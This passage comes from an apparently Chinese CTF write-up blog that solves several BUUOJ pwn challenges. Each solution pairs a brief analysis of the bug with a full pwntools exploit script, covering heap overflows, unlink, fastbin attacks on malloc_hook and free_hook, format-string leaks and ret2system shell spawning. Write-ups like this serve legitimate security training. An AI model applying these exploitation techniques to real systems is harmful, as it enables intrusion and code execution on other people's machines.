delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'Heap'</span>,str(size))    sa(<span class="hljs-string">'heap'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'heap'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))add(<span class="hljs-number">0x18</span>,<span class="hljs-string">'\x00'</span>)add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'bbbb'</span>)add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'cccc'</span>)add(<span class="hljs-number">0x10</span>,<span class="hljs-string">'dddd'</span>)payload = <span class="hljs-number">0x18</span> * <span class="hljs-string">'a'</span> + <span class="hljs-string">'\xa1'</span>edit(<span class="hljs-number">0</span>,payload)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">0x10</span>,<span class="hljs-string">'\x78'</span>)show(<span class="hljs-number">1</span>)ru(<span class="hljs-string">'Content : '</span>)base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>info_addr(<span class="hljs-string">'libc_base'</span>,base)free(<span class="hljs-number">1</span>)free_hook = <span class="hljs-number">0x3c67a8</span> + basepaylaod = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">2</span> * <span class="hljs-number">8</span>  + p64(<span class="hljs-number">8</span>) + p64(free_hook)add(<span class="hljs-number">0x30</span>,paylaod)rce = base + rce16[<span class="hljs-number">1</span>]edit(<span class="hljs-number">2</span>,p64(rce))free(<span class="hljs-number">0</span>)itr()</code></pre></div><h2 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a><code>0ctf_2017_babyheap</code></h2><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><p>保护全开，程序逆向起来看起来很乱，并且堆块定位是通过栈来传参，没有全局指针。</p><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>calloc 函数基本跟malloc一样，但是再分配好堆块时，会把分配到的堆块全部清理为0。</p><h5 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h5><p>无法通过传统的unsortbin来leak libc，结合fill函数中的堆溢出即可。</p><h4 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>Fill 函数中，明显有堆溢出，且十分好用，效果很大。</p><h3 id="exp-17"><a href="#exp-17" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./0ctf_2017_babyheap'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26374</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>    sla(<span class="hljs-string">'Command'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'Size'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'mand'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'ize'</span>,str(size))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'mand'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'mand'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#1</span>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#3</span>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#4</span>add(<span class="hljs-number">0x20</span>) <span class="hljs-comment">#5</span>payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x30</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xa1</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span>fill(<span class="hljs-number">0</span>,<span class="hljs-number">0x60</span>,payload)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">0x30</span>)dump(<span class="hljs-number">2</span>)ru(<span class="hljs-string">'Content: \n'</span>)base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>info_addr(<span class="hljs-string">'libc_base'</span>,base)add(<span class="hljs-number">0x50</span>) <span class="hljs-comment">#6</span>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#7</span>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#8</span>free(<span class="hljs-number">7</span>)free(<span class="hljs-number">8</span>)malloc_hook = base + <span class="hljs-number">0x3c4b10</span>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">13</span> + p64(<span class="hljs-number">0x71</span>) + p64(malloc_hook<span class="hljs-number">-0x23</span>) fill(<span class="hljs-number">5</span>,len(payload),payload)add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#7</span>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#8</span>rec = rce16[<span class="hljs-number">1</span>] + basepayload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x13</span> + p64(rec)fill(<span class="hljs-number">8</span>,len(payload),payload)add(<span class="hljs-number">0x20</span>)itr()</code></pre></div><h2 id="wustctf2020-closed"><a href="#wustctf2020-closed" class="headerlink" title="wustctf2020_closed"></a><code>wustctf2020_closed</code></h2><div class="hljs"><pre><code class="hljs c">close(<span class="hljs-number">1</span>);close(<span class="hljs-number">2</span>);<span class="hljs-keyword">return</span> shell();</code></pre></div><p>直接就给你shell了，但是stdout已经被关闭了。但是对其文件描述符<code>1</code>进行重定向为没有关闭的<code>0</code>即可。</p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> 1&gt;&amp;0 &amp;&amp; cat flag</code></pre></div><h2 id="wustctf2020-getshell-2"><a href="#wustctf2020-getshell-2" class="headerlink" title="wustctf2020_getshell_2"></a><code>wustctf2020_getshell_2</code></h2><h3 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">ssize_t</span> vulnerable()&#123;  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [esp+0h] [ebp-18h]</span>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x24</span>u);&#125;</code></pre></div><p>明显可以看出只可以控制2个gadget。优先想到了栈迁移。可是也没有合适地方去迁移利用。</p><p>倘若可以控制3个gadget，直接：</p><div class="hljs"><pre><code class="hljs c">p32(system.plt) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(sh)</code></pre></div><p>这样就可以拿到shell了。</p><p>因为平时rop时，32位下自己<strong>十分</strong>经常**用<code>函数的plt+返回地址+参数1</code>，造成思路卡顿。</p><h4 id="突破"><a href="#突破" class="headerlink" title="突破"></a>突破</h4><p>但是尝试去看下后门函数：</p><div class="hljs"><pre><code class="hljs c">.text:<span class="hljs-number">08048521</span> ; <span class="hljs-number">2</span>:   <span class="hljs-keyword">return</span> system(<span class="hljs-string">"/bbbbbbbbin_what_the_f?ck__--??/sh"</span>);.text:<span class="hljs-number">08048521</span>                 sub     esp, <span class="hljs-number">0</span>Ch.text:<span class="hljs-number">08048524</span>                 push    offset command  ; <span class="hljs-string">"/bbbbbbbbin_what_the_f?ck__--??/sh"</span>.text:<span class="hljs-number">08048529</span>                 call    _system.text:<span class="hljs-number">0804852</span>E                 add     esp, <span class="hljs-number">10</span>h.text:<span class="hljs-number">08048531</span>                 nop.text:<span class="hljs-number">08048532</span>                 leave.text:<span class="hljs-number">08048533</span>                 retn</code></pre></div><p>在08048524处，可以看到起其call system前，<code>push    offset command</code>，把这个字符串压栈，来作为第一个参数。</p><p> 那就在溢出时，返回地址填上<code>08048529</code> ，在自己填上sh的地址即可了。</p><p>这样就在call system时，完成的是<code>system(sh)</code>。</p><p>其实也是很简单的：</p><p>由于<code>因为平时rop时，32位下自己经常用`函数的plt+返回地址+参数1`，造成思路卡顿。</code> ，其实自己分析以后就是：<code>函数的plt+4字节+参数1</code>。</p><p>溢出时，填上<code>p32(0x8048529) + p32(sh)</code><br>栈信息：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-selector-tag">0000</span>| <span class="hljs-selector-tag">0xffcca2fc</span> <span class="hljs-selector-tag">--</span>&gt; <span class="hljs-selector-tag">0x8048529</span> (&lt;shell+<span class="hljs-number">14</span>&gt;:     call   <span class="hljs-number">0</span>x80483e0 &lt;system<span class="hljs-variable">@plt</span>&gt;)<span class="hljs-selector-tag">0004</span>| <span class="hljs-selector-tag">0xffcca300</span> <span class="hljs-selector-tag">--</span>&gt; <span class="hljs-selector-tag">0x8048670</span> <span class="hljs-selector-tag">--</span>&gt; <span class="hljs-selector-tag">0x6873</span> (<span class="hljs-string">'sh'</span>)</code></pre></div><p>在溢出调用时,ret到：</p><div class="hljs"><pre><code class="hljs undefined">.<span class="hljs-built_in">text</span>:<span class="hljs-number">08048529</span>                 <span class="hljs-built_in">call</span>    <span class="hljs-variable">_system</span></code></pre></div><p>其就是</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">push</span> <span class="hljs-built_in">eip</span>+<span class="hljs-number">4</span><span class="hljs-keyword">jmp</span> system.plt</code></pre></div><p>然后栈就变成了：</p><div class="hljs"><pre><code class="hljs undefined">=&gt; <span class="hljs-number">0x80483e0</span> &lt;<span class="hljs-symbol">system@</span>plt&gt;:      jmp    DWORD PTR ds:<span class="hljs-number">0x804a018</span> | <span class="hljs-number">0x80483e6</span> &lt;<span class="hljs-symbol">system@</span>plt+<span class="hljs-number">6</span>&gt;:    push   <span class="hljs-number">0x18</span> | <span class="hljs-number">0x80483eb</span> &lt;<span class="hljs-symbol">system@</span>plt+<span class="hljs-number">11</span>&gt;:   jmp    <span class="hljs-number">0x80483a0</span> | <span class="hljs-number">0x80483f0</span> &lt;<span class="hljs-symbol">__libc_start_main@</span>plt&gt;:   jmp    DWORD PTR ds:<span class="hljs-number">0x804a01c</span> | <span class="hljs-number">0x80483f6</span> &lt;<span class="hljs-symbol">__libc_start_main@</span>plt+<span class="hljs-number">6</span>&gt;: push   <span class="hljs-number">0x20</span> |-&gt;   <span class="hljs-number">0x80483e6</span> &lt;<span class="hljs-symbol">system@</span>plt+<span class="hljs-number">6</span>&gt;:        push   <span class="hljs-number">0x18</span>       <span class="hljs-number">0x80483eb</span> &lt;<span class="hljs-symbol">system@</span>plt+<span class="hljs-number">11</span>&gt;:       jmp    <span class="hljs-number">0x80483a0</span>       <span class="hljs-number">0x80483f0</span> &lt;<span class="hljs-symbol">__libc_start_main@</span>plt&gt;:       jmp    DWORD PTR ds:<span class="hljs-number">0x804a01c</span>       <span class="hljs-number">0x80483f6</span> &lt;<span class="hljs-symbol">__libc_start_main@</span>plt+<span class="hljs-number">6</span>&gt;:     push   <span class="hljs-number">0x20</span>                                                                  JUMP <span class="hljs-keyword">is</span> taken[------------------------------------stack-------------------------------------]<span class="hljs-number">0000</span>| <span class="hljs-number">0xffcca2fc</span> --&gt; <span class="hljs-number">0x804852e</span> (&lt;shell+<span class="hljs-number">19</span>&gt;:     add    esp,<span class="hljs-number">0x10</span>)<span class="hljs-number">0004</span>| <span class="hljs-number">0xffcca300</span> --&gt; <span class="hljs-number">0x8048670</span> --&gt; <span class="hljs-number">0x6873</span> (<span class="hljs-string">'sh'</span>)</code></pre></div><p>这就变成了，自己熟悉的<code>函数的plt+返回地址+参数1</code></p><h3 id="exp-18"><a href="#exp-18" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined">from pwn <span class="hljs-built_in">import</span> *<span class="hljs-built_in">import</span> time<span class="hljs-attr">local_file</span>  = './wustctf2020_getshell_2'<span class="hljs-attr">elf</span> = ELF(local_file)context.<span class="hljs-attr">log_level</span> = 'debug'<span class="hljs-attr">debug</span> = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    <span class="hljs-attr">io</span> = process(local_file)    <span class="hljs-attr">libc</span> = elf.libc<span class="hljs-keyword">else</span>:    <span class="hljs-attr">io</span> = remote('node3.buuoj.cn',<span class="hljs-number">25032</span>)    <span class="hljs-attr">libc</span> = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.<span class="hljs-attr">arch</span> = elf.archcontext.<span class="hljs-attr">terminal</span> = ['tmux','neww']<span class="hljs-attr">offset</span> = <span class="hljs-number">28</span><span class="hljs-attr">sh</span> = elf.search('sh\x00').next()<span class="hljs-attr">system</span> = <span class="hljs-number">0</span>x8048529<span class="hljs-attr">payload</span> = 'a' * offset + p32(system) + p32(sh)s(payload)itr()</code></pre></div><h2 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a><code>axb_2019_heap</code></h2><h3 id="分析-16"><a href="#分析-16" class="headerlink" title="分析"></a>分析</h3><p>保护全开。</p><h4 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h4><ul><li>格式化字符串漏洞，可以泄漏出程序和libc的基址</li><li>edit函数中，错误的size选取，导致每次可以多溢出0x10的字节，威力就很大了，prev size与 size都可以改到。</li></ul><p>直接进行unlink攻击即可。估计就是考这个的，程序限制了不能申请0x80以下的堆块，且key值基本没办法改到。</p><h3 id="exp-19"><a href="#exp-19" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./axb_2019_heap'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26837</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'(0-10)'</span>,str(idx))    sla(<span class="hljs-string">'size'</span>,str(size))    sla(<span class="hljs-string">'content'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'content'</span>,str(data))payload = <span class="hljs-string">'%15$p'</span> + <span class="hljs-string">'%11$p'</span>sla(<span class="hljs-string">'name'</span>,payload)ru(<span class="hljs-string">'Hello, 0x'</span>)libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x20830</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)ru(<span class="hljs-string">'0x'</span>)bin_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x1186</span>info_addr(<span class="hljs-string">'bin_base'</span>,bin_base)note = bin_base + <span class="hljs-number">0x202060</span>key = bin_base + <span class="hljs-number">0x202040</span>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x88</span>,<span class="hljs-string">'aaaaaaaa'</span>)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">'bbbbbbbb'</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x88</span>,<span class="hljs-string">'cccccccc'</span>)payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + p64(note<span class="hljs-number">-0x18</span>) + p64(note - <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0x30</span>)payload += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">9</span> + p64(<span class="hljs-number">0x80</span>) + p64(<span class="hljs-number">0x110</span>)edit(<span class="hljs-number">0</span>,payload)free(<span class="hljs-number">1</span>)free_hook = <span class="hljs-number">0x3c67a8</span> + libc_basepayload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(free_hook) + p64(<span class="hljs-number">0x88</span>)edit(<span class="hljs-number">0</span>,payload)rec = rce16[<span class="hljs-number">1</span>] + libc_baseedit(<span class="hljs-number">0</span>,p64(rec))free(<span class="hljs-number">2</span>)itr()</code></pre></div><h2 id="hitcontraining-unlink"><a href="#hitcontraining-unlink" class="headerlink" title="hitcontraining_unlink"></a><code>hitcontraining_unlink</code></h2><h3 id="分析-17"><a href="#分析-17" class="headerlink" title="分析"></a>分析</h3><p>Edit函数中，有个大威力的堆溢出。<br>用unlink攻击。</p><h3 id="exp-20"><a href="#exp-20" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./bamboobox'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26818</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'len'</span>,str(size))    sa(<span class="hljs-string">'name'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'len'</span>,str(size))    sa(<span class="hljs-string">'name'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))note = <span class="hljs-number">0x006020C0</span> + <span class="hljs-number">8</span>add(<span class="hljs-number">0x88</span>,<span class="hljs-string">'aaaaaaaa'</span>)add(<span class="hljs-number">0x100</span>,<span class="hljs-string">'bbbbbbbb'</span>)add(<span class="hljs-number">0x88</span>,<span class="hljs-string">'cccccccc'</span>)payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + p64(note<span class="hljs-number">-0x18</span>) + p64(note - <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0x30</span>)payload += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">9</span> + p64(<span class="hljs-number">0x80</span>) + p64(<span class="hljs-number">0x110</span>)edit(<span class="hljs-number">0</span>,len(payload),payload)free(<span class="hljs-number">1</span>)show()ru(<span class="hljs-string">'0 : '</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c48e0</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)free_hook = <span class="hljs-number">0x3c67a8</span> + libc_basepayload = p64(libc_base + <span class="hljs-number">0x3c48e0</span>) + p64(<span class="hljs-number">0</span>)  + p64(<span class="hljs-number">0x88</span>) + p64(free_hook)edit(<span class="hljs-number">0</span>,len(payload),payload)rec = rce16[<span class="hljs-number">1</span>] + libc_baseedit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(rec))free(<span class="hljs-number">2</span>)itr()</code></pre></div><h2 id="ciscn-2019-s-9"><a href="#ciscn-2019-s-9" class="headerlink" title="ciscn_2019_s_9"></a><code>ciscn_2019_s_9</code></h2><h3 id="分析-18"><a href="#分析-18" class="headerlink" title="分析"></a>分析</h3><p>32位程序，保护全关，目标定位着shellcode去。</p><h4 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>栈溢出，可以溢出14个字节，这是32位程序用rop就可以打了。但是为相对麻烦一点。</p><div class="hljs"><pre><code class="hljs python">.text:<span class="hljs-number">08048551</span>             hint            proc near.text:<span class="hljs-number">08048551</span>             ; __unwind &#123;.text:<span class="hljs-number">08048551</span> <span class="hljs-number">55</span>                          push    ebp.text:<span class="hljs-number">08048552</span> <span class="hljs-number">89</span> E5                       mov     ebp, esp.text:<span class="hljs-number">08048554</span> FF E4                       jmp     esp.text:<span class="hljs-number">08048554</span>             hint            endp</code></pre></div><p>在题目当中，有个hint函数，就是给提示的，提示到<code>jmp esp</code> 这个gadget。</p><p>其中，可以想到在栈溢出中，有给<code>ret addr</code>填上<code>jmp esp</code> ，在接上shellcode。这应该是很经典的用法。</p><p>参考链接：<a href="http://www.atomsec.org/%E5%AE%89%E5%85%A8/%E6%A0%88%E6%BA%A2%E5%87%BAjmp-esp%E5%8E%9F%E7%90%86/" target="_blank" rel="noopener">http://www.atomsec.org/%E5%AE%89%E5%85%A8/%E6%A0%88%E6%BA%A2%E5%87%BAjmp-esp%E5%8E%9F%E7%90%86/</a></p><p>构造思路：</p><div class="hljs"><pre><code class="hljs undefined">Payload = overflow + jmp esp<span class="hljs-built_in"> address </span>+ shellcode</code></pre></div><p>但是这个题就是只能溢出14字节，返回地址再占用4字节，应该没有10字节这样少的shellcode。</p><p>所以转变一下，栈上填充好shellcode，然后<code>jmp esp address</code>，接着让其执行<code>sub esp,0x28</code>，然后在跳转esp。</p><div 